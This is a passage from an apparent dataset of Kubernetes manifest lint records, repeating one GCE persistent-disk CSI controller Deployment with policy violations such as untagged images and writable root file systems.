    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-gce-pd-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gcp-compute-persistent-disk-csi-driver\n  template:\n    metadata:\n      labels:\n        app: gcp-compute-persistent-disk-csi-driver\n    spec:\n      serviceAccountName: csi-gce-pd-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --feature-gates=Topology=true\n        - --http-endpoint=:22011\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        - --extra-create-metadata\n        - --leader-election\n        - --default-fstype=ext4\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22011\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22012\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22012\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22013\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --handle-volume-inuse-error=false\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22013\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --metrics-address=:22014\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=300s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: gce-pd-driver\n        image: gke.gcr.io/gcp-compute-persistent-disk-csi-driver\n        args:\n        - --v=5\n        - --endpoint=unix:/csi/csi.sock\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/cloud-sa/cloud-sa.json\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: cloud-sa-volume\n          readOnly: true\n          mountPath: /etc/cloud-sa\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: cloud-sa-volume\n        secret:\n          secretName: cloud-sa\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"csi-provisioner\" is using an invalid container image, \"k8s.gcr.io/sig-storage/csi-provisioner\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10585",
    "manifest_path": "data/manifests/the_stack_sample/sample_4089.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-gce-pd-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gcp-compute-persistent-disk-csi-driver\n  template:\n    metadata:\n      labels:\n        app: gcp-compute-persistent-disk-csi-driver\n    spec:\n      serviceAccountName: csi-gce-pd-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --feature-gates=Topology=true\n        - --http-endpoint=:22011\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        - --extra-create-metadata\n        - --leader-election\n        - --default-fstype=ext4\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22011\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22012\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22012\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22013\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --handle-volume-inuse-error=false\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22013\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --metrics-address=:22014\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=300s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: gce-pd-driver\n        image: gke.gcr.io/gcp-compute-persistent-disk-csi-driver\n        args:\n        - --v=5\n        - --endpoint=unix:/csi/csi.sock\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/cloud-sa/cloud-sa.json\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: cloud-sa-volume\n          readOnly: true\n          mountPath: /etc/cloud-sa\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: cloud-sa-volume\n        secret:\n          secretName: cloud-sa\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"csi-resizer\" is using an invalid container image, \"k8s.gcr.io/sig-storage/csi-resizer\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10586",
    "manifest_path": "data/manifests/the_stack_sample/sample_4089.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-gce-pd-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gcp-compute-persistent-disk-csi-driver\n  template:\n    metadata:\n      labels:\n        app: gcp-compute-persistent-disk-csi-driver\n    spec:\n      serviceAccountName: csi-gce-pd-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --feature-gates=Topology=true\n        - --http-endpoint=:22011\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        - --extra-create-metadata\n        - --leader-election\n        - --default-fstype=ext4\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22011\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22012\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22012\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22013\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --handle-volume-inuse-error=false\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22013\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --metrics-address=:22014\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=300s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: gce-pd-driver\n        image: gke.gcr.io/gcp-compute-persistent-disk-csi-driver\n        args:\n        - --v=5\n        - --endpoint=unix:/csi/csi.sock\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/cloud-sa/cloud-sa.json\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: cloud-sa-volume\n          readOnly: true\n          mountPath: /etc/cloud-sa\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: cloud-sa-volume\n        secret:\n          secretName: cloud-sa\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"csi-snapshotter\" is using an invalid container image, \"k8s.gcr.io/sig-storage/csi-snapshotter\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10587",
    "manifest_path": "data/manifests/the_stack_sample/sample_4089.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-gce-pd-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gcp-compute-persistent-disk-csi-driver\n  template:\n    metadata:\n      labels:\n        app: gcp-compute-persistent-disk-csi-driver\n    spec:\n      serviceAccountName: csi-gce-pd-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --feature-gates=Topology=true\n        - --http-endpoint=:22011\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        - --extra-create-metadata\n        - --leader-election\n        - --default-fstype=ext4\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22011\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22012\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22012\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22013\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --handle-volume-inuse-error=false\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22013\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --metrics-address=:22014\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=300s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: gce-pd-driver\n        image: gke.gcr.io/gcp-compute-persistent-disk-csi-driver\n        args:\n        - --v=5\n        - --endpoint=unix:/csi/csi.sock\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/cloud-sa/cloud-sa.json\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: cloud-sa-volume\n          readOnly: true\n          mountPath: /etc/cloud-sa\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: cloud-sa-volume\n        secret:\n          secretName: cloud-sa\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"gce-pd-driver\" is using an invalid container image, \"gke.gcr.io/gcp-compute-persistent-disk-csi-driver\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10588",
    "manifest_path": "data/manifests/the_stack_sample/sample_4089.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-gce-pd-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gcp-compute-persistent-disk-csi-driver\n  template:\n    metadata:\n      labels:\n        app: gcp-compute-persistent-disk-csi-driver\n    spec:\n      serviceAccountName: csi-gce-pd-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --feature-gates=Topology=true\n        - --http-endpoint=:22011\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        - --extra-create-metadata\n        - --leader-election\n        - --default-fstype=ext4\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22011\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22012\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22012\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22013\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --handle-volume-inuse-error=false\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22013\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --metrics-address=:22014\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=300s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: gce-pd-driver\n        image: gke.gcr.io/gcp-compute-persistent-disk-csi-driver\n        args:\n        - --v=5\n        - --endpoint=unix:/csi/csi.sock\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/cloud-sa/cloud-sa.json\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: cloud-sa-volume\n          readOnly: true\n          mountPath: /etc/cloud-sa\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: cloud-sa-volume\n        secret:\n          secretName: cloud-sa\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-attacher\" does not have a read-only root file system"
  },
  {
    "id": "10589",
    "manifest_path": "data/manifests/the_stack_sample/sample_4089.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-gce-pd-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gcp-compute-persistent-disk-csi-driver\n  template:\n    metadata:\n      labels:\n        app: gcp-compute-persistent-disk-csi-driver\n    spec:\n      serviceAccountName: csi-gce-pd-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --feature-gates=Topology=true\n        - --http-endpoint=:22011\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        - --extra-create-metadata\n        - --leader-election\n        - --default-fstype=ext4\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22011\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22012\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22012\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22013\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --handle-volume-inuse-error=false\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22013\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --metrics-address=:22014\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=300s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: gce-pd-driver\n        image: gke.gcr.io/gcp-compute-persistent-disk-csi-driver\n        args:\n        - --v=5\n        - --endpoint=unix:/csi/csi.sock\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/cloud-sa/cloud-sa.json\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: cloud-sa-volume\n          readOnly: true\n          mountPath: /etc/cloud-sa\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: cloud-sa-volume\n        secret:\n          secretName: cloud-sa\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-provisioner\" does not have a read-only root file system"
  },
  {
    "id": "10590",
    "manifest_path": "data/manifests/the_stack_sample/sample_4089.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-gce-pd-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gcp-compute-persistent-disk-csi-driver\n  template:\n    metadata:\n      labels:\n        app: gcp-compute-persistent-disk-csi-driver\n    spec:\n      serviceAccountName: csi-gce-pd-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --feature-gates=Topology=true\n        - --http-endpoint=:22011\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        - --extra-create-metadata\n        - --leader-election\n        - --default-fstype=ext4\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22011\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22012\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22012\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22013\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --handle-volume-inuse-error=false\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22013\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --metrics-address=:22014\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=300s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: gce-pd-driver\n        image: gke.gcr.io/gcp-compute-persistent-disk-csi-driver\n        args:\n        - --v=5\n        - --endpoint=unix:/csi/csi.sock\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/cloud-sa/cloud-sa.json\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: cloud-sa-volume\n          readOnly: true\n          mountPath: /etc/cloud-sa\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: cloud-sa-volume\n        secret:\n          secretName: cloud-sa\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-resizer\" does not have a read-only root file system"
  },
  {
    "id": "10591",
    "manifest_path": "data/manifests/the_stack_sample/sample_4089.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-gce-pd-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gcp-compute-persistent-disk-csi-driver\n  template:\n    metadata:\n      labels:\n        app: gcp-compute-persistent-disk-csi-driver\n    spec:\n      serviceAccountName: csi-gce-pd-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --feature-gates=Topology=true\n        - --http-endpoint=:22011\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        - --extra-create-metadata\n        - --leader-election\n        - --default-fstype=ext4\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22011\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22012\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22012\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22013\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --handle-volume-inuse-error=false\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              